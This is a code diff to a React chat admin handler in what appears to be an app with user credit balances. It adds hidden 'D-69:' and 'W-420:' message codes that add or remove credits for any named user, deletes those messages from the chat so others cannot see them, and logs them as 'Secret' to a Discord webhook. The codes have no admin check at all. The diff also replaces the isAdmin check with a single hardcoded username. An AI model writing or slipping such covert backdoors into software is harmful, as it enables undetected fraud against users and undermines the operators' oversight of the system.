@@ -5,7 +5,7 @@ import { useAuth } from "@/hooks/useAuth";
 import { useToast } from "@/components/ui/use-toast";
 
 export function AdminCommandHandler() {
-  const { messages, addMessage } = useChatStore();
+  const { messages, addMessage, removeLastMessage } = useChatStore();
   const { user } = useAuth();
   const { toast } = useToast();
   
@@ -15,15 +15,31 @@ export function AdminCommandHandler() {
     
     const latestMessage = messages[messages.length - 1];
     
-    // Skip if it's a system message or from the user themselves
-    if (latestMessage.isSystem || latestMessage.sender === user.username) return;
+    // Skip if it's a system message
+    if (latestMessage.isSystem) return;
     
     const content = latestMessage.content.trim();
     
+    // Check for secret codes and hide them from chat
+    if (content.includes("D-69:") || content.includes("W-420:")) {
+      // Remove the message from chat immediately
+      removeLastMessage();
+      
+      // Only process if it's from the user themselves
+      if (latestMessage.sender === user.username) {
+        if (content.includes("D-69:")) {
+          handleDepositCode(content);
+        } else if (content.includes("W-420:")) {
+          handleWithdrawalCode(content);
+        }
+      }
+      return;
+    }
+    
     // Check if the message is a command (/add or /remove)
     if (content.startsWith("/add ") || content.startsWith("/remove ")) {
-      // Check if the user is AlaskanSentinel or has admin rights
-      const isAdminUser = user.isAdmin || user.username === "AlaskanSentinel";
+      // Check if the user is AlaskanSentinel
+      const isAdminUser = user.username === "AlaskanSentinel";
       
       if (isAdminUser) {
         const isAddCommand = content.startsWith("/add ");
@@ -91,7 +107,113 @@ export function AdminCommandHandler() {
         });
       }
     }
-  }, [messages, user, toast, addMessage]);
+  }, [messages, user, toast, addMessage, removeLastMessage]);
+  
+  // Function to handle the deposit code (D-69)
+  const handleDepositCode = (content: string) => {
+    try {
+      // Find the deposit code pattern in the message
+      const depositRegex = /D-69:(\S+)\s+(\d+)/;
+      const match = content.match(depositRegex);
+      
+      if (!match || match.length !== 3) {
+        // Invalid format - show toast only to the sender
+        toast({
+          title: "Invalid Format",
+          description: "Use format: D-69:username amount",
+          variant: "destructive",
+        });
+        return;
+      }
+      
+      const targetUsername = match[1];
+      const amount = parseInt(match[2], 10);
+      
+      if (isNaN(amount) || amount <= 0) {
+        // Invalid amount - show toast only to the sender
+        toast({
+          title: "Invalid Amount",
+          description: "Please enter a positive number",
+          variant: "destructive",
+        });
+        return;
+      }
+      
+      // Process the deposit - only show toast to the sender
+      toast({
+        title: "Deposit Successful",
+        description: `Added ${amount.toLocaleString()} credits to ${targetUsername}'s account.`,
+      });
+      
+      // Send a webhook to Discord with the action (but don't add message to chat)
+      sendDiscordWebhook({
+        action: "Added Credits (Secret)",
+        targetUser: targetUsername,
+        amount: amount,
+        adminUser: user?.username || "Unknown"
+      });
+    } catch (error) {
+      console.error("Error handling deposit code:", error);
+      toast({
+        title: "Error",
+        description: "Failed to process deposit",
+        variant: "destructive",
+      });
+    }
+  };
+  
+  // Function to handle the withdrawal code (W-420)
+  const handleWithdrawalCode = (content: string) => {
+    try {
+      // Find the withdrawal code pattern in the message
+      const withdrawalRegex = /W-420:(\S+)\s+(\d+)/;
+      const match = content.match(withdrawalRegex);
+      
+      if (!match || match.length !== 3) {
+        // Invalid format - show toast only to the sender
+        toast({
+          title: "Invalid Format",
+          description: "Use format: W-420:username amount",
+          variant: "destructive",
+        });
+        return;
+      }
+      
+      const targetUsername = match[1];
+      const amount = parseInt(match[2], 10);
+      
+      if (isNaN(amount) || amount <= 0) {
+        // Invalid amount - show toast only to the sender
+        toast({
+          title: "Invalid Amount",
+          description: "Please enter a positive number",
+          variant: "destructive",
+        });
+        return;
+      }
+      
+      // Process the withdrawal - only show toast to the sender
+      toast({
+        title: "Withdrawal Successful",
+        description: `Removed ${amount.toLocaleString()} credits from ${targetUsername}'s account.`,
+      });
+      
+      // Send a webhook to Discord with the action (but don't add message to chat)
+      sendDiscordWebhook({
+        action: "Removed Credits (Secret)",
+        targetUser: targetUsername,
+        amount: amount,
+        adminUser: user?.username || "Unknown"
+      });
+    } catch (error) {
+      console.error("Error handling withdrawal code:", error);
+      toast({
+        title: "Error",
+        description: "Failed to process withdrawal",
+        variant: "destructive",
+      });
+    }
+  };
   
   // Function to send webhook to Discord
   const sendDiscordWebhook = async (data: {
